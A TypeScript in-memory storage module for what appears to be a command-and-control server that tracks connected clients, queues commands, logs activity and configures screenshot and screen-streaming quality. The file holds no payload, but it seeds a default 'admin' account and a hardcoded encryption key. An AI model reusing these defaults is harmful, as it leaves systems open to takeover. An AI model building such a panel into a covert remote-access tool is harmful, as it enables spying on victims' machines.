import { 
  User, InsertUser, 
  Client, InsertClient, 
  Command, InsertCommand, 
  Activity, InsertActivity, 
  Setting, InsertSetting 
} from "@shared/schema";

export interface IStorage {
  // User operations
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  // Client operations
  getClient(id: number): Promise<Client | undefined>;
  getClientByClientId(clientId: string): Promise<Client | undefined>;
  getAllClients(): Promise<Client[]>;
  getActiveClients(): Promise<Client[]>;
  createClient(client: InsertClient): Promise<Client>;
  updateClient(clientId: string, data: Partial<InsertClient>): Promise<Client | undefined>;
  updateClientLastSeen(clientId: string): Promise<Client | undefined>;
  
  // Command operations
  getCommand(id: number): Promise<Command | undefined>;
  getCommandsByClientId(clientId: string): Promise<Command[]>;
  getPendingCommands(clientId: string): Promise<Command[]>;
  getAllCommands(): Promise<Command[]>;
  createCommand(command: InsertCommand): Promise<Command>;
  updateCommandStatus(id: number, status: string, output?: string): Promise<Command | undefined>;
  
  // Activity operations
  createActivity(activity: InsertActivity): Promise<Activity>;
  getRecentActivities(limit?: number): Promise<Activity[]>;
  getActivitiesByClientId(clientId: string): Promise<Activity[]>;
  
  // Settings operations
  getSetting(key: string): Promise<Setting | undefined>;
  getAllSettings(): Promise<Setting[]>;
  updateSetting(key: string, value: string): Promise<Setting | undefined>;
  createSetting(setting: InsertSetting): Promise<Setting>;
  
  // Stats operations
  getStats(): Promise<any>;
}

export class MemStorage implements IStorage {
  private users: Map<number, User>;
  private clients: Map<number, Client>;
  private commands: Map<number, Command>;
  private activities: Map<number, Activity>;
  private settings: Map<number, Setting>;
  
  private currentUserId: number;
  private currentClientId: number;
  private currentCommandId: number;
  private currentActivityId: number;
  private currentSettingId: number;
  
  constructor() {
    this.users = new Map();
    this.clients = new Map();
    this.commands = new Map();
    this.activities = new Map();
    this.settings = new Map();
    
    this.currentUserId = 1;
    this.currentClientId = 1;
    this.currentCommandId = 1;
    this.currentActivityId = 1;
    this.currentSettingId = 1;
    
    // Initialize with default admin user
    this.createUser({
      username: "admin",
      password: "$2b$10$ZFVW0iFE3mNS3Oa0YsbE9OaQFx1wqgPRYX/qwupRB6.MlXI3Zs6.i", // "admin"
      apiKey: "C2_SERVER_API_KEY"
    });
    
    // Initialize with default settings
    this.createSetting({
      key: "screenshotQuality",
      value: "50",
      description: "Default screenshot quality (1-100)"
    });
    
    this.createSetting({
      key: "streamQuality",
      value: "30",
      description: "Default streaming quality (1-100)"
    });
    
    this.createSetting({
      key: "frameRate",
      value: "5",
      description: "Default frames per second for streaming"
    });
    
    this.createSetting({
      key: "encryptionKey",
      value: "EynDnmNF4fipxGmiErq0hMOC-lXBuBxgRhIAHQDM8XA",
      description: "AES-256 encryption key for client communications"
    });
    
    this.createSetting({
      key: "sessionTimeout",
      value: "30",
      description: "Session timeout in minutes"
    });
  }
  
  // User operations
  async getUser(id: number): Promise<User | undefined> {
    return this.users.get(id);
  }
  
  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }
  
  async createUser(insertUser: InsertUser): Promise<User> {
    const id = this.currentUserId++;
    const now = new Date();
    const user: User = { ...insertUser, id, createdAt: now };
    this.users.set(id, user);
    return user;
  }
  
  // Client operations
  async getClient(id: number): Promise<Client | undefined> {
    return this.clients.get(id);
  }
  
  async getClientByClientId(clientId: string): Promise<Client | undefined> {
    return Array.from(this.clients.values()).find(
      (client) => client.clientId === clientId,
    );
  }
  
  async getAllClients(): Promise<Client[]> {
    return Array.from(this.clients.values());
  }
  
  async getActiveClients(): Promise<Client[]> {
    return Array.from(this.clients.values()).filter(
      (client) => client.status === "active",
    );
  }
  
  async createClient(insertClient: InsertClient): Promise<Client> {
    const id = this.currentClientId++;
    const now = new Date();
    const client: Client = { 
      ...insertClient, 
      id, 
      firstSeen: now, 
      lastSeen: now
    };
    this.clients.set(id, client);
    
    // Create an activity for the new client
    await this.createActivity({
      clientId: client.clientId,
      type: "connection",
      description: `New client connected: ${client.clientId}`,
      data: { hostname: client.hostname, ip: client.ip }
    });
    
    return client;
  }
  
  async updateClient(clientId: string, data: Partial<InsertClient>): Promise<Client | undefined> {
    const client = await this.getClientByClientId(clientId);
    if (!client) return undefined;
    
    const updatedClient = { ...client, ...data, lastSeen: new Date() };
    this.clients.set(client.id, updatedClient);
    return updatedClient;
  }
  
  async updateClientLastSeen(clientId: string): Promise<Client | undefined> {
    const client = await this.getClientByClientId(clientId);
    if (!client) return undefined;
    
    const updatedClient = { ...client, lastSeen: new Date() };
    this.clients.set(client.id, updatedClient);
    return updatedClient;
  }
  
  // Command operations
  async getCommand(id: number): Promise<Command | undefined> {
    return this.commands.get(id);
  }
  
  async getCommandsByClientId(clientId: string): Promise<Command[]> {
    return Array.from(this.commands.values()).filter(
      (command) => command.clientId === clientId,
    );
  }
  
  async getPendingCommands(clientId: string): Promise<Command[]> {
    return Array.from(this.commands.values()).filter(
      (command) => command.clientId === clientId && command.status === "pending",
    );
  }
  
  async getAllCommands(): Promise<Command[]> {
    return Array.from(this.commands.values());
  }
  
  async createCommand(insertCommand: InsertCommand): Promise<Command> {
    const id = this.currentCommandId++;
    const now = new Date();
    const command: Command = { 
      ...insertCommand, 
      id, 
      createdAt: now,
      completedAt: null 
    };
    this.commands.set(id, command);
    
    // Create an activity for the new command
    await this.createActivity({
      clientId: command.clientId,
      type: "command",
      description: `Command executed on ${command.clientId}`,
      data: { command: command.command, commandId: id }
    });
    
    return command;
  }
  
  async updateCommandStatus(id: number, status: string, output?: string): Promise<Command | undefined> {
    const command = await this.getCommand(id);
    if (!command) return undefined;
    
    const updatedCommand: Command = { 
      ...command, 
      status, 
      output: output || command.output,
      completedAt: status === "completed" ? new Date() : command.completedAt 
    };
    this.commands.set(id, updatedCommand);
    
    // Create an activity for the command result
    if (status === "completed") {
      await this.createActivity({
        clientId: command.clientId,
        type: "commandResult",
        description: `Command result received from ${command.clientId}`,
        data: { command: command.command, commandId: id, status }
      });
    }
    
    return updatedCommand;
  }
  
  // Activity operations
  async createActivity(insertActivity: InsertActivity): Promise<Activity> {
    const id = this.currentActivityId++;
    const now = new Date();
    const activity: Activity = { ...insertActivity, id, createdAt: now };
    this.activities.set(id, activity);
    return activity;
  }
  
  async getRecentActivities(limit: number = 20): Promise<Activity[]> {
    return Array.from(this.activities.values())
      .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime())
      .slice(0, limit);
  }
  
  async getActivitiesByClientId(clientId: string): Promise<Activity[]> {
    return Array.from(this.activities.values())
      .filter((activity) => activity.clientId === clientId)
      .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime());
  }
  
  // Settings operations
  async getSetting(key: string): Promise<Setting | undefined> {
    return Array.from(this.settings.values()).find(
      (setting) => setting.key === key,
    );
  }
  
  async getAllSettings(): Promise<Setting[]> {
    return Array.from(this.settings.values());
  }
  
  async updateSetting(key: string, value: string): Promise<Setting | undefined> {
    const setting = Array.from(this.settings.values()).find(
      (setting) => setting.key === key,
    );
    if (!setting) return undefined;
    
    const updatedSetting = { ...setting, value };
    this.settings.set(setting.id, updatedSetting);
    return updatedSetting;
  }
  
  async createSetting(insertSetting: InsertSetting): Promise<Setting> {
    const id = this.currentSettingId++;
    const setting: Setting = { ...insertSetting, id };
    this.settings.set(id, setting);
    return setting;
  }
  
  // Stats operations
  async getStats(): Promise<any> {
    const activeClients = await this.getActiveClients();
    const allCommands = await this.getAllCommands();
    const completedCommands = allCommands.filter(cmd => cmd.status === "completed");
    
    // Count streams by looking at activities for stream_start without corresponding stream_stop
    const streamActivities = Array.from(this.activities.values())
      .filter(activity => ["streamStart", "streamStop"].includes(activity.type));
    
    const streamsByClient = new Map<string, boolean>();
    
    for (const activity of streamActivities) {
      if (activity.clientId) {
        if (activity.type === "streamStart") {
          streamsByClient.set(activity.clientId, true);
        } else if (activity.type === "streamStop") {
          streamsByClient.set(activity.clientId, false);
        }
      }
    }
    
    const activeStreams = Array.from(streamsByClient.values()).filter(isActive => isActive).length;
    
    return {
      activeClientCount: activeClients.length,
      totalClientCount: this.clients.size,
      commandsExecuted: completedCommands.length,
      totalCommands: allCommands.length,
      activeStreams
    };
  }
}

export const storage = new MemStorage();
